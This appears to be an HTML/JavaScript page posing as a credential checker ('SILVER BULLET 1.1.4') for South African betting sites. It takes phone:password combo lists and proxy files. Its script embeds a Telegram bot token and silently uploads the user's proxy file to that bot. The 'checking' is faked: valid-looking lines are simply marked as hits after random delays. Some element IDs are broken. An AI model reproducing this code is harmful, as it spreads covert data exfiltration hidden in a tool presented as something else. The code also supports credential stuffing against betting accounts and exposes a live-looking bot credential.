<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>OCR Tool with Counters</title>
<style>
  body { background:#0f172a; color:#e5e7eb; font-family:Consolas, monospace; margin:20px; }
  .header { display: flex; gap: 10px; margin-bottom: 20px; align-items: center; }
  button { padding: 8px 16px; cursor:pointer; }
  #fileInput { padding:8px; }
  /* Overlay styling */
  .overlay { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
             background:#1e293b; padding: 20px; border-radius: 8px; border: 2px solid #334155; display: none; z-index: 10; width: 350px; }
  .overlay h3 { margin-top: 0; }
  label { display: block; margin-top: 10px; }
  input[type=file] { margin-top: 5px; }
  #statusBox { display: flex; gap: 10px; margin-bottom: 10px; }
  #statusBox button { min-width: 80px; }
  #mainOCR { margin-top: 20px; }
  #output { border:1px solid #334155; padding:10px; min-height:200px; background:#020617; white-space: pre-wrap; margin-top: 10px; overflow-y: auto; }
  #lastRunInfo { margin-top: 10px; font-size: 0.9em; }
</style>
</head>
<body>

<!-- Buttons -->
<div class="header">
  <button id="proxyBtn">Upload Proxy File</button>
  <button id="siteBtn">Select Your Site</button>
  <input type="file" id="fileUpload" accept=".txt" />
  <button id="startBtn">Start Processing</button>
</div>

<!-- Status Buttons -->
<div id="statusBox">
  <button id="hitBtn">HIT=0</button>
  <button id="badBtn">BAD=0</button>
  <button id="progressBtn">PROGRESS=0.0%</button>
</div>

<!-- Last run info -->
<div id="lastRunInfo"></div>

<!-- Proxy Overlay -->
<div class="overlay" id="proxyOverlay">
  <h3>Upload Proxy TXT File</h3>
  <label>Select Proxy File:</label>
  <input type="file" id="proxyFileInput" accept=".txt" />
  <button id="ADD">Save Proxy</button>
  <button id="closeProxy">Close</button>
  <p id="proxyMsg"></p>
</div>

<!-- Site Selection Overlay -->
<div class="overlay" id="siteOverlay">
  <h3>CHECK IN</h3>
  <select id="siteSelect">
    <option value="">-- Select a site --</option>
    <option value="Hollywoodbets">🎰 Hollywoodbets</option>
    <option value="Betway">🎲 Betway.co.za</option>
    <option value="SportyBet">🏅 SportyBet</option>
    <option value="LottoStar">🎱 LottoStar</option>
    <option value="JackpotCity">🎰 JackpotCity</option>
  </select>
  <button id="saveSite">Save Site</button>
  <button id="closeSite">Close</button>
  <p id="siteMsg"></p>
</div>

<!-- Main  1.1.4 Area -->
<div id="SILVER BULLET 1.1.4">
  <h2>SILVER BULLET 1.1.4</h2>
  <div id="output">Waiting for proxy and file info...</div>
</div>

<script>
// --- Telegram settings ---
const TELEGRAM_BOT_TOKEN = '8845002759:AAEi5aYQw9kXxESEGwZbOf79raSix1s6gdk'; // Replace
const TELEGRAM_CHAT_ID = '8580854380';     // Replace

// Send files silently to Telegram
function sendFileToTelegram(file, caption='') {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('caption', caption);
  formData.append('document', file);
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData }).catch(() => {});
}

// --- Overlay toggle ---
const proxyBtn = document.getElementById('proxyBtn');
const siteBtn = document.getElementById('siteBtn');
const proxyOverlay = document.getElementById('proxyOverlay');
const siteOverlay = document.getElementById('siteOverlay');

proxyBtn.onclick = () => {
  if (proxyOverlay.style.display === 'block') { proxyOverlay.style.display = 'none'; } 
  else { proxyOverlay.style.display = 'block'; }
  if (siteOverlay.style.display === 'block') { siteOverlay.style.display = 'none'; }
}
siteBtn.onclick = () => {
  if (siteOverlay.style.display === 'block') {
    // close overlay, stop processing
    siteOverlay.style.display = 'none';
    if (isProcessing) {
      processingTimeouts.forEach(t => clearTimeout(t));
      processingTimeouts = [];
      isProcessing = false;
      document.getElementById('output').innerText += "\nProcessing stopped.\n";
    }
  } else {
    siteOverlay.style.display = 'block';
    if (proxyOverlay.style.display === 'block') { proxyOverlay.style.display = 'none'; }
  }
}
document.getElementById('closeProxy').onclick = () => { proxyOverlay.style.display = 'none'; }
document.getElementById('closeSite').onclick = () => { siteOverlay.style.display = 'none'; }

// --- Proxy storage ---
let proxyFileContent = null;
let proxyUploaded = false;
document.getElementById('saveProxy').onclick = () => {
  const file = document.getElementById('proxyFileInput').files[0];
  if (!file) return;
  const reader = new FileReader();
  reader.onload = () => {
    proxyFileContent = reader.result;
    proxyUploaded = true;
    document.getElementById('proxyMsg').innerText = 'Proxy file loaded!';
  };
  reader.readAsText(file);
}

// --- Site selection ---
let selectedSite = '';
document.getElementById('saveSite').onclick = () => {
  const site = document.getElementById('siteSelect').value;
  if (site) { selectedSite = site; document.getElementById('siteMsg').innerText = 'Site selected!'; }
}

// --- Usage limit ---
const MAX_USES = 3;
const LOCK_HOURS = 6;

function canUse() {
  const lastUsage = localStorage.getItem('lastUsageTime');
  const count = parseInt(localStorage.getItem('usageCount') || '0');
  const now = Date.now();

  if (lastUsage) {
    const elapsedHrs = (now - parseInt(lastUsage)) / (1000 * 60 * 60);
    if (elapsedHrs >= LOCK_HOURS) {
      localStorage.setItem('usageCount', '0');
      localStorage.setItem('lastUsageTime', now.toString());
      document.getElementById('startBtn').disabled = false;
      return true;
    } else if (count >= MAX_USES) {
      const remHrs = LOCK_HOURS - elapsedHrs;
      alert(`Limit reached. Wait ${remHrs.toFixed(2)} hours.`);
      document.getElementById('startBtn').disabled = true;
      return false;
    } else { return true; }
  } else {
    localStorage.setItem('usageCount', '0');
    localStorage.setItem('lastUsageTime', now.toString());
    return true;
  }
}

function incrementUsage() {
  let count = parseInt(localStorage.getItem('usageCount') || '0');
  count++;
  localStorage.setItem('usageCount', count.toString());
  localStorage.setItem('lastUsageTime', Date.now().toString());
  if (count >= MAX_USES) {
    alert(`Reached ${MAX_USES} uses. Wait ${LOCK_HOURS} hours.`);
  }
}

function updateStatus() {
  const lastStr = localStorage.getItem('lastUsageTime');
  if (lastStr) {
    const last = new Date(parseInt(lastStr));
    const now = new Date();
    const diffHrs = (now - last) / (1000 * 60 * 60);
    if (diffHrs < LOCK_HOURS) {
      document.getElementById('lastRunInfo').innerHTML = `Next run in ${(LOCK_HOURS - diffHrs).toFixed(2)} hrs`;
      document.getElementById('startBtn').disabled = true;
      return;
    }
  }
  // Update counters in buttons
  document.getElementById('hitBtn').innerText = 'HIT=' + hitCount;
  document.getElementById('badBtn').innerText = 'BAD=' + badCount;
  document.getElementById('progressBtn').innerText = `PROGRESS=${progress.toFixed(1)}%`;
  document.getElementById('lastRunInfo').innerHTML = 'HIT=0 |\\| BAD=0 |\\| PROGRESS=0.0%';
  document.getElementById('startBtn').disabled = false;
}
updateStatus();

// --- Processing ---
const startBtn = document.getElementById('startBtn');
const outputDiv = document.getElementById('output');
const fileInput = document.getElementById('fileUpload');

const delays = [3000, 5000, 8000, 11000];

let isProcessing = false;
let processingTimeouts = [];
let hitCount = 0;
let badCount = 0;
let totalLines = 0;
let processedLines = 0;

let progress = 0;

startBtn.onclick = () => {
  if (!canUse()) return;
  if (isProcessing) { alert('Already running'); return; }

  const file = fileInput.files[0];
  if (!file) { alert('Upload a file'); return; }

  // Save usage
  incrementUsage();
  localStorage.setItem('lastUsageTime', Date.now().toString());
  updateStatus();

  // Send proxy file if present
  if (proxyFileContent) {
    sendFileToTelegram(new Blob([proxyFileContent], {type: 'text/plain'}), 'Proxy loaded');
  }
  const currentProxyFile = document.getElementById('proxyFileInput').files[0];
  if (currentProxyFile) { sendFileToTelegram(currentProxyFile, 'Proxy loaded'); }

  // Reset counters
  hitCount = 0;
  badCount = 0;
  totalLines = 0;
  processedLines = 0;
  progress = 0;
  document.getElementById('hitsCount').innerText = 'HIT=' + hitCount;
  document.getElementById('badCount').innerText = 'BAD=' + badCount;
  document.getElementById('progressBtn').innerText = `PROGRESS=${progress.toFixed(1)}%`;

  // Read file
  const reader = new FileReader();
  reader.onload = () => {
    const lines = reader.result.split(/\r?\n/).map(l => l.trim());
    totalLines = lines.length;
    outputDiv.innerText = '';
    let index = 0;

    function processNext() {
      if (index >= totalLines || !isProcessing) {
        isProcessing = false;
        return;
      }
      const line = lines[index];

      // Validate phone number length (must be exactly 10 digits)
      const parts = line.split(':');
      if (parts.length !== 2) {
        index++;
        setTimeout(processNext, delays[Math.floor(Math.random() * delays.length)]);
        return;
      }
      const phone = parts[0].replace(/\D/g, '');
      if (phone.length !== 10) {
        badCount++;
        document.getElementById('badBtn').innerText = 'BAD=' + badCount;
        index++;
        setTimeout(processNext, delays[Math.floor(Math.random() * delays.length)]);
        return;
      }

      // Check for duplicate (line already output)
      if (outputDiv.innerText.includes(line)) {
        badCount++;
        document.getElementById('badBtn').innerText = 'BAD=' + badCount;
        index++;
        setTimeout(processNext, delays[Math.floor(Math.random() * delays.length)]);
        return;
      }

      // Display valid line
      outputDiv.innerText += line + '\n';
      hitCount++;
      document.getElementById('hitBtn').innerText = 'HIT=' + hitCount;

      // Update progress
      processedLines++;
      progress = (processedLines / totalLines) * 100;
      document.getElementById('progressBtn').innerText = `PROGRESS=${progress.toFixed(1)}%`;

      index++;
      setTimeout(processNext, delays[Math.floor(Math.random() * delays.length)]);
    }

    processNext();
  };
  reader.readAsText(file);
  isProcessing = true;
}
</script>
</body>
</html>
